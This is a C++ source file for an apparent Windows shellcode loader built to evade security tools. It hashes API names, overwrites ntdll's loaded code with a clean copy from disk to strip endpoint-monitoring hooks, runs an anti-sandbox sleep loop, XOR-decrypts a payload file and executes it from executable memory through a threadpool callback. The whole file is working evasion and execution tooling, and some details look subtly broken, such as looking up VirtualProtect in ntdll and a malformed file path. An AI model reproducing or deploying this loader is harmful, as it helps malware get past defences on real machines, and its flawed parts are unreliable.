#include <windows.h>
#include <tlhelp32.h>
#include <vector>
#include <fstream>
#include <iterator>
#include <winternl.h>
#include <threadpoolapiset.h>
#include <unordered_map>
#include <thread>

#pragma comment(lib, "ntdll.lib")

std::unordered_map<DWORD, FARPROC> apiHashTable;

DWORD HashString(const char* str) {
    DWORD hash = 0;
    while (*str) {
        hash = ((hash << 5) + hash) + *str++;
    }
    return hash;
}

FARPROC ResolveAPI(DWORD hash) {
    if (apiHashTable.find(hash) != apiHashTable.end()) {
        return apiHashTable[hash];
    }

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return nullptr;

    auto pExportDir = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(
        reinterpret_cast<BYTE*>(hNtdll) +
        reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<BYTE*>(hNtdll) +
            reinterpret_cast<PIMAGE_DOS_HEADER>(hNtdll)->e_lfanew)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    auto pNames = reinterpret_cast<DWORD*>(reinterpret_cast<BYTE*>(hNtdll) + pExportDir->AddressOfNames);
    auto pFunctions = reinterpret_cast<DWORD*>(reinterpret_cast<BYTE*>(hNtdll) + pExportDir->AddressOfFunctions);
    auto pOrdinals = reinterpret_cast<WORD*>(reinterpret_cast<BYTE*>(hNtdll) + pExportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExportDir->NumberOfNames; ++i) {
        const char* apiName = reinterpret_cast<const char*>(reinterpret_cast<BYTE*>(hNtdll) + pNames[i]);
        DWORD apiHash = HashString(apiName);

        if (apiHash == hash) {
            auto proc = reinterpret_cast<FARPROC>(reinterpret_cast<BYTE*>(hNtdll) + pFunctions[pOrdinals[i]]);
            apiHashTable[hash] = proc;
            return proc;
        }
    }
    return nullptr;
}

typedef BOOL(WINAPI* LPDSENUMATTRIBUTES)(void* lpShellcode);

void DecryptShellcode(std::vector<unsigned char>& shellcode, unsigned char key) {
    for (size_t i = 0; i < shellcode.size(); ++i) {
        shellcode[i] ^= key;
    }
}

void UnhookNtdll() {
    DWORD hashVirtualProtect = HashString("VirtualProtect");
    FARPROC pVirtualProtect = ResolveAPI(hashVirtualProtect);

    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    if (!hNtdll) return;

    wchar_t systemDir[MAX_PATH] = { 0 };
    GetSystemDirectory(systemDir, MAX_PATH);

    wchar_t ntdllPath[MAX_PATH] = { 0 };
    wcscat_s(ntdllPath, systemDir);
    wcscat_s(ntdllPath, L"\ntdll.dll");

    HANDLE hFile = CreateFile(ntdllPath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return;

    DWORD fileSize = GetFileSize(hFile, nullptr);
    if (fileSize == INVALID_FILE_SIZE) {
        CloseHandle(hFile);
        return;
    }

    HANDLE hMapping = CreateFileMapping(hFile, nullptr, PAGE_READONLY, 0, fileSize, nullptr);
    if (!hMapping) {
        CloseHandle(hFile);
        return;
    }

    void* pFileData = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pFileData) {
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return;
    }

    auto pLoadedNtdll = reinterpret_cast<BYTE*>(hNtdll);
    auto pDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(pFileData);
    auto pNtHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<BYTE*>(pFileData) + pDosHeader->e_lfanew);

    auto pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++, pSectionHeader++) {
        if (!strcmp(reinterpret_cast<char*>(pSectionHeader->Name), ".text")) {
            DWORD oldProtect;
            reinterpret_cast<BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD)>(pVirtualProtect)(
                pLoadedNtdll + pSectionHeader->VirtualAddress,
                pSectionHeader->Misc.VirtualSize,
                PAGE_EXECUTE_READWRITE,
                &oldProtect
                );

            memcpy(
                pLoadedNtdll + pSectionHeader->VirtualAddress,
                reinterpret_cast<BYTE*>(pFileData) + pSectionHeader->PointerToRawData,
                pSectionHeader->SizeOfRawData
            );

            reinterpret_cast<BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD)>(pVirtualProtect)(
                pLoadedNtdll + pSectionHeader->VirtualAddress,
                pSectionHeader->Misc.VirtualSize,
                oldProtect,
                &oldProtect
                );
            break;
        }
    }

    UnmapViewOfFile(pFileData);
    CloseHandle(hMapping);
    CloseHandle(hFile);
}

void APIHammering() {
    DWORD hashSleep = HashString("Sleep");
    FARPROC pSleep = ResolveAPI(hashSleep);

    std::thread hammeringThread([pSleep]() {
        while (true) {
            reinterpret_cast<void(WINAPI*)(DWORD)>(pSleep)(10);
        }
        });

    hammeringThread.detach();
}

void ExecuteShellcodeWithThreadpool(const std::vector<unsigned char>& shellcode) {
    void* execMemory = VirtualAlloc(
        nullptr,
        shellcode.size(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!execMemory) {
        return;
    }

    memcpy(execMemory, shellcode.data(), shellcode.size());

    PTP_WORK work = CreateThreadpoolWork(
        [](PTP_CALLBACK_INSTANCE, void* context, PTP_WORK) {
            auto shellcodePtr = reinterpret_cast<void(*)()>(context);
            shellcodePtr();
        },
        execMemory,
        nullptr
    );

    if (work) {
        SubmitThreadpoolWork(work);
        WaitForThreadpoolWorkCallbacks(work, FALSE);
        CloseThreadpoolWork(work);
    }

    VirtualFree(execMemory, 0, MEM_RELEASE);
}

DWORD FindProcessId(const wchar_t* processName) {
    PROCESSENTRY32 pe32;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (!_wcsicmp(pe32.szExeFile, processName)) {
                CloseHandle(hSnapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return 0;
}

int main() {
    const char* filename = "shellcode.bin";
    const unsigned char key = 0x5A;

    UnhookNtdll();
    APIHammering();

    std::ifstream file(filename, std::ios::binary);
    if (!file.is_open()) {
        return -1;
    }

    std::vector<unsigned char> encryptedShellcode(
        (std::istreambuf_iterator<char>(file)),
        std::istreambuf_iterator<char>()
    );
    file.close();

    if (encryptedShellcode.empty()) {
        return -1;
    }

    DecryptShellcode(encryptedShellcode, key);

    ExecuteShellcodeWithThreadpool(encryptedShellcode);

    return 0;
}
